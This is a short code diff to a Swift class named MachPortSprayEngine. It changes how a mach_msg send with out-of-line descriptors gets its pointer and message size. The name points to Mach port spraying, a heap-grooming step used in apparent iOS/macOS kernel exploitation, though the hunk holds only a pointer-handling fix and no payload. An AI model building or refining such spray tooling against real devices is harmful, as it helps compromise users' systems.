@@ -259,11 +259,12 @@ class MachPortSprayEngine: ObservableObject {
             msg.ool.type = mach_msg_descriptor_type_t(MACH_MSG_OOL_DESCRIPTOR)
         }
         
-        withUnsafePointer(to: &msg) { ptr in
+        let msgSize = msg.header.msgh_size
+        withUnsafeMutablePointer(to: &msg) { ptr in
             let _ = mach_msg(
-                UnsafeMutablePointer(mutating: UnsafeRawPointer(ptr).assumingMemoryBound(to: mach_msg_header_t.self)),
+                UnsafeMutableRawPointer(ptr).assumingMemoryBound(to: mach_msg_header_t.self),
                 MACH_SEND_MSG | Int32(MACH_SEND_TIMEOUT),
-                msg.header.msgh_size,
+                msgSize,
                 0,
                 mach_port_t(MACH_PORT_NULL),
                 100, // timeout ms
